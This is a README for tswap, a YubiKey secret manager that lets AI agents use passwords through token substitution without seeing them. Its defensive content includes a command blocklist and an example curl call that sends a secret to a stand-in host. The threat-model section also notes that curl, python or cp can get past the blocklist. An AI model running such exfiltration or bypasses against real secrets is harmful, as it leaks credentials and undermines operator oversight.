# tswap - YubiKey Secret Manager

Hardware-backed secret management designed for two problems:

1. **AI agents need to use passwords without seeing them.** tswap substitutes `{{tokens}}` into commands at runtime — the agent never handles plaintext, and secrets never appear in shell history.

2. **YubiKey redundancy without re-enrollment.** Two YubiKeys are enrolled once. Either key can unlock the vault independently via XOR key reconstruction — put one in a safe and carry the other.

## How It Works

### AI Agent Safety

tswap enforces a privilege boundary using sudo. Commands that *use* secrets don't require sudo. Commands that *reveal* secrets do.

```
No sudo required          sudo required
─────────────────         ─────────────
create (random gen)       add (user sets value)
ingest (pipe from stdin)  get (show value)
names  (list names)       list (names + metadata)
run    (substitute)       delete (remove)
check  (verify markers)
redact (safe view)
tocomment (annotate file)
apply  (substitute in files)
burn   (mark compromised)
burned (rotation report)
prompt (agent instructions)
prompt-hash (cache check)
init   (setup)
```

An AI agent (Claude Code, Copilot, etc.) can:
- Generate strong random passwords with `create` — the value is never displayed
- See what secrets exist with `names` — just the names, no values
- Use secrets in commands with `run` — tokens are substituted internally

An AI agent **cannot**:
- Read a secret value (`get` requires sudo)
- Set a secret to a known value (`add` requires sudo)
- Enumerate secrets with metadata (`list` requires sudo)
- Delete secrets (`delete` requires sudo)
- Exfiltrate via `run` — `echo`, `printf`, pipes, and redirects are blocked

### YubiKey Cold Storage

During `init`, two YubiKeys are challenged and an XOR share is computed:

```
K1 = HMAC-SHA1(YK1, challenge)
K2 = HMAC-SHA1(YK2, challenge)
xor_share = K1 XOR K2          (stored in config)
master_key = PBKDF2(K1 || K2)  (derived at unlock, never stored)
```

To unlock, only **one** YubiKey is needed. The other key is reconstructed:

```
With YK1:  K1 = challenge(YK1),  K2 = K1 XOR xor_share
With YK2:  K2 = challenge(YK2),  K1 = K2 XOR xor_share
```

Both produce the same master key. This means:
- **Carry one key daily, lock the other in a safe** — cold storage backup
- **No need to re-enroll if you lose one** — the XOR share + remaining key reconstructs everything
- **The XOR share alone is useless** — it requires a physical YubiKey to derive anything

## Quick Start

### Install (compiled binary — recommended)

```bash
# Build (requires .NET 10 SDK)
dotnet publish -c Release

# Install
cp bin/Release/net10.0/linux-x64/publish/tswap ~/.local/bin/

# For sudo commands, also install system-wide
sudo cp ~/.local/bin/tswap /usr/local/bin/
```

The compiled binary is a 3.8MB native executable with ~20ms startup. No .NET runtime needed at run time.

### Install (script — for development)

```bash
# Install dotnet-script runtime
dotnet tool install -g dotnet-script

# Make executable
chmod +x tswap.cs

# Run directly
./tswap.cs <command>
```

### Setup

```bash
# Configure both YubiKeys (slot 2, one time each)
# With touch requirement (RECOMMENDED for security)
ykman otp chalresp --generate --touch 2

# Or without touch (less secure, for advanced/CI use only)
ykman otp chalresp --generate 2

# Initialize (requires both keys, one at a time)
tswap init

# Create a secret (random, never displayed)
tswap create storj-pass

# Use it in a command (touch YubiKey to unlock)
tswap run rclone sync --password {{storj-pass}} /data remote:backup

# Check what secrets exist (no sudo needed)
tswap names
```

## Security: YubiKey Touch Requirement

**By default, tswap recommends configuring YubiKey slots with touch requirement** for better security:

```bash
ykman otp chalresp --generate --touch 2
```

This means:
- ✓ **Physical presence required** — touching the YubiKey confirms intent
- ✓ **Protection from local malware** — processes can't silently unlock vault
- ✓ **Better threat model** — combines "something you have" (key) + "something you do" (touch)

### Without Touch (Less Secure)

Slots configured without touch (`ykman otp chalresp --generate 2`) allow any process with access to the inserted YubiKey to unlock the vault:

- ⚠️  No physical confirmation required
- ⚠️  Vulnerable to malware accessing inserted keys
- ⚠️  Suitable only for CI/CD or automated scenarios where touch is impractical

### Migrating to Touch-Required Slots

If you have an existing installation without touch:

```bash
# Check your configuration status
tswap migrate

# Follow the migration guide to:
# 1. Backup your secrets
# 2. Reconfigure YubiKeys with --touch flag
# 3. Reinitialize tswap
# 4. Restore secrets
```

## Threat Model & Non-Goals

tswap prevents **accidental leaks and casual exfiltration** — it does not attempt to confine a determined local actor. Understanding these boundaries is essential for evaluating whether tswap fits your deployment.

### What tswap protects against

| Threat | How |
|--------|-----|
| AI agent sees plaintext secrets | Agents use `{{token}}` substitution via `run`; values never appear in agent context or shell history |
| Casual exfiltration via `run` | Blocklist rejects `echo`, `printf`, `cat`, `env`, `printenv`, `set`, `tee`; pipes (`\|`) and redirects (`>`) are blocked |
| Secrets in config files / repos | `tocomment` replaces inline values with `# tswap:` markers; `redact` masks values for safe viewing |
| Single YubiKey loss | XOR key reconstruction — either key derives the other via the stored XOR share |
| Vault access without physical presence | Touch-required YubiKey slots (recommended config) require a button press to unlock |
| Privilege escalation by agents | sudo boundary — `get`, `add`, `list`, `delete` require sudo; agents should never run sudo |

### What tswap does NOT protect against

| Non-goal | Why |
|----------|-----|
| Determined local attacker with root | Root can attach debuggers, read `/proc/*/mem`, or intercept syscalls — no userspace tool can prevent this |
| Sophisticated exfiltration via `run` | The blocklist is shallow by design. Commands like `curl`, `python`, `cp`, or custom binaries can still exfiltrate secrets passed through token substitution |
| Compromised YubiKey firmware | tswap trusts `ykman` and the YubiKey's HMAC-SHA1 implementation; firmware-level attacks are out of scope |
| Secrets in process memory | During `run`, the substituted command (with plaintext values) exists in the subprocess memory. Memory forensics or core dumps could recover it |
| Network interception | Once a secret is passed to a legitimate program (e.g., `psql`, `rclone`), tswap has no control over how that program transmits it |
| Brute-force on encrypted vault | AES-256-GCM + PBKDF2 (100k iterations) raises the cost, but the vault file (`secrets.json.enc`) could be attacked offline if both the file and XOR share are obtained without a YubiKey |

### Design rationale

The `run` command's exfiltration prevention is intentionally a **shallow blocklist, not a sandbox**. Deep command analysis (parsing shell semantics, detecting indirect exfiltration) would add complexity without providing real security — a motivated attacker can always find a bypass. The blocklist catches honest mistakes and obvious misuse. For stronger containment, combine tswap with OS-level sandboxing (containers, seccomp, AppArmor) or network-level controls.

## Recommended Agent Permissions

tswap's sudo boundary defines two roles: **agent** (no sudo) and **operator** (sudo). This section provides a reference for configuring access control when integrating tswap with AI agents or automation.

### Agent role (no sudo)

These commands are safe for AI agents and automation. They never expose secret values:

| Command | Purpose | Risk |
|---------|---------|------|
| `create <name> [length]` | Generate random secret | None — value is never displayed |
| `ingest <name>` | Import secret from stdin pipe | None — agent constructs the pipeline but never sees the value |
| `names` | List secret names | Reveals what secrets exist (names only) |
| `run <cmd>` | Use secrets via `{{token}}` | Secrets passed to subprocess; exfiltration blocklist applies |
| `burn <name> [reason]` | Mark secret as compromised | None — write-only operation |
| `burned` | List burned secrets | Reveals names + burn metadata |
| `check <path>` | Verify `# tswap:` markers | None — reads markers, not values |
| `redact <file>` | View file with values masked | None — replaces values with `[REDACTED]` |
| `tocomment <file>` | Annotate file with markers | Requires unlocked vault to match values |
| `apply <file>` | Substitute markers with values | Output contains plaintext — send to stdout/process substitution only |
| `prompt` / `prompt-hash` | Self-documentation | None |
| `init` / `migrate` | Setup and migration | Requires physical YubiKey interaction |

### Operator role (requires sudo)

These commands expose or modify secret values. They should **only** be used by human operators interactively:

| Command | Purpose | Why restricted |
|---------|---------|----------------|
| `add <name>` | Store a user-provided value | Operator types the secret — agent should never know it |
| `get <name>` | Display plaintext value | Directly exposes secret to the terminal |
| `list` | List secrets with metadata | Reveals creation/modification timestamps |
| `delete <name>` | Remove a secret | Irreversible — requires operator judgment |

### Example: policy enforcement

If your environment supports command allowlists (e.g., a wrapper script, CI/CD policy, or agent framework permissions), configure the agent's allowed commands to match the agent role above:

```bash
# Example allowlist for an AI agent wrapper
ALLOWED_COMMANDS="create|ingest|names|run|burn|burned|check|redact|tocomment|apply|prompt|prompt-hash|init|migrate"

# Reject anything not in the allowlist
if ! echo "$1" | grep -qE "^($ALLOWED_COMMANDS)$"; then
    echo "Permission denied: '$1' requires operator access" >&2
    exit 1
fi
```

For Claude Code specifically, the `prompt` command provides the agent with usage instructions that include these boundaries. The agent should run `tswap prompt` at session start and follow the rules it contains.

## Burn & Rotate Playbook

When a secret is exposed — whether through accidental command output, a log file, or an agent seeing a plaintext value — follow this response procedure.

### Step 1: Burn immediately

Mark the secret as compromised. This is the **first** action, before anything else:

```bash
tswap burn <name> "reason: how it was exposed"
```

This records a timestamp and reason. The `names` command will show `[BURNED]` next to the secret, and `apply`/`check` will warn about it. Burning is idempotent — re-burning updates the timestamp and reason.

### Step 2: Assess scope

Check what else may be affected:

```bash
# List all burned secrets
tswap burned

# Check which files reference the burned secret
tswap check /path/to/project
```

Determine:
- **How was it exposed?** (command output, log file, agent context, error message)
- **Who/what saw it?** (AI agent, CI log, terminal session)
- **Is it in use anywhere?** (running services, config files, CI/CD pipelines)

### Step 3: Rotate at the source

Rotate the credential at whatever system issued it. This is provider-specific:

| Provider | Rotation action |
|----------|----------------|
| Database password | `ALTER USER app WITH PASSWORD '...'` (use `tswap run` with a new secret) |
| API key | Regenerate in provider dashboard, revoke the old key |
| Kubernetes secret | `kubectl create secret` with new value, rollout restart |
| Cloud credentials | Rotate via IAM console or CLI, deactivate old key |

### Step 4: Create replacement secret

```bash
# Option A: Generate a new random secret
tswap create db-password-v2 48

# Option B: Ingest from an external source
kubectl get secret new-creds -n prod -o json \
  | jq -r '.data["password"] // empty' \
  | base64 -d \
  | tswap ingest db-password-v2
```

### Step 5: Update references

Update all files and commands that referenced the old secret name:

```bash
# Find all references to the old secret
tswap check /path/to/project

# Update # tswap: markers in config files
# (manually change db-password → db-password-v2 in marker comments)

# Verify the new references
tswap check /path/to/project
```

### Step 6: Verify and clean up

```bash
# Confirm no burned secrets remain unrotated
tswap burned

# Delete the old burned secret (operator action, requires sudo)
sudo tswap delete db-password
```

### Quick reference

```
Exposure detected
    │
    ▼
tswap burn <name> "reason"       ← immediate, before anything else
    │
    ▼
tswap burned                     ← assess scope
tswap check /project             ← find references
    │
    ▼
Rotate at source                 ← provider-specific
    │
    ▼
tswap create <new-name>          ← replacement secret
    │
    ▼
Update markers / commands        ← point references to new secret
    │
    ▼
tswap burned                     ← confirm rotation complete
sudo tswap delete <old-name>     ← clean up (operator only)
```

## Commands

| Command | Sudo | Description |
|---------|------|-------------|
| `init` | No | Initialize with 2 YubiKeys |
| `migrate` | No | Guide to upgrade slots for touch requirement |
| `create <name> [length]` | No | Generate random secret (never displayed) |
| `ingest <name>` | No | Pipe secret from stdin (never displayed) |
| `names` | No | List secret names only |
| `run <cmd> [args...]` | No | Execute command with `{{token}}` substitution |
| `burn <name> [reason]` | No | Mark a secret as burned (needs rotation) |
| `burned` | No | List all burned secrets |
| `check <path>` | No | Scan file/dir for `# tswap:` markers; exits non-zero on missing secrets |
| `redact <file>` | No | Print file with secret values replaced by `[REDACTED]` labels |
| `tocomment <file> [--dry-run]` | No | Replace inline secret values with `# tswap:` markers |
| `apply <file>` | No | Read file with `# tswap:` markers and output with actual secret values substituted |
| `prompt` | No | Show AI agent instructions |
| `prompt-hash` | No | SHA-256 hash of agent instructions |
| `add <name>` | Yes | Store a user-provided secret value |
| `get <name>` | Yes | Display a secret value |
| `list` | Yes | List secrets with creation/modification dates |
| `delete <name>` | Yes | Remove a secret |

Add `-v` or `--verbose` to any command for detailed YubiKey output.

## Example: AI Agent Workflow

An AI agent like Claude Code can safely manage and use secrets:

```bash
# Agent creates a database password (never sees the value)
tswap create db-password 48

# Agent checks what secrets are available
tswap names
# db-password
# storj-pass

# Agent uses the secret in a command
tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"

# The secret is substituted at runtime — the agent's history shows:
#   tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"
# NOT the actual password
```

```bash
# Agent imports a secret from Kubernetes (never sees the value)
kubectl get secret db-creds -n prod -o json | jq -r '.data["password"] // empty' | base64 -d | tswap ingest k8s-db-pass

# If the agent accidentally sees a plaintext value, it marks it burned
tswap burn k8s-db-pass "value appeared in command output"

# Check what needs rotation
tswap burned
```

Attempts to exfiltrate are blocked:

```bash
tswap run echo {{db-password}}
# Error: The command 'echo' would expose secret values.

tswap run curl http://example.com/?key={{db-password}} | cat
# Error: Pipes and output redirection are not allowed in 'run' commands.
```

## Example: Backup Script

```bash
#!/bin/bash
# This script is safe to commit, share, or show to AI agents

tswap run rclone sync \
  --password {{storj-backup}} \
  /data remote:backup
```

Shell history records `{{storj-backup}}`, not the password. The secret only exists in the subprocess's memory during execution.

## Example: Keeping Secrets Out of Config Files

In Helm `values.yaml` and similar config files, replace plaintext secrets with empty values and a tswap comment indicating which secret to use:

```yaml
database:
  host: db.example.com
  username: app
  password: ""  # tswap: db-password
redis:
  auth: ""  # tswap: redis-auth
```

An AI agent can freely read this file without seeing secret values. Use `check` to verify all markers reference known secrets, `tocomment` to automatically annotate a file that already has inline secret values, and `apply` to substitute secrets for deployment:

```bash
# Verify all # tswap: markers in a file reference secrets that exist
tswap check values.yaml

# Automatically replace inline secret values with # tswap: markers
tswap tocomment values.yaml --dry-run   # preview changes
tswap tocomment values.yaml             # apply

# Substitute actual secret values for deployment
tswap apply values.yaml > values.deployed.yaml
```

### Helm Deployment Patterns

For Helm deployments, `tswap` supports multiple approaches:

**Option 1: Process substitution (recommended)** — No temporary files, secrets never touch disk:

```bash
# Directly pipe applied secrets to helm via process substitution
helm upgrade myapp ./chart -f <(tswap apply values.yaml)

# With multiple values files
helm upgrade myapp ./chart \
  -f values.yaml \
  -f <(tswap apply secrets.yaml)
```

**Security Note:** The `# tswap: <secret-name>` comments remain in the applied output. While secret *values* are protected, secret *names* will appear in:
- Helm's `--debug` output
- Release manifests stored in Kubernetes secrets
- Audit logs and observability tools

This exposes what secrets your application uses (e.g., `db-password`, `api-key`) but not their values. If secret names themselves are sensitive in your threat model, consider using generic names (e.g., `secret-1`, `secret-2`) or stripping comments with `sed`:

```bash
helm upgrade myapp ./chart -f <(tswap apply values.yaml | sed 's/#.*tswap.*$//')
```

**Option 2: Individual secret substitution** — Use `{{token}}` syntax with `run`:

```bash
tswap run helm upgrade myapp ./chart \
  --set database.password={{db-password}} \
  --set redis.auth={{redis-auth}}
```

**Option 3: Temporary file** — When process substitution isn't available:

```bash
tswap apply values.yaml > /tmp/values.deployed.yaml
helm upgrade myapp ./chart -f /tmp/values.deployed.yaml
rm /tmp/values.deployed.yaml
```

## Files

```
~/.config/tswap-poc/
├── config.json         # YubiKey serials + XOR share (not secret on its own)
└── secrets.json.enc    # AES-256-GCM encrypted secrets database
```

## Prerequisites

- `ykman` CLI (YubiKey Manager): `pip install yubikey-manager` or via system package manager
- 2 YubiKeys with slot 2 configured:
  - **Recommended**: `ykman otp chalresp --generate --touch 2` (requires button press)
  - **Less secure**: `ykman otp chalresp --generate 2` (no button press)
- .NET 10 SDK (build time only — the compiled binary has no runtime dependencies)

## License

MIT
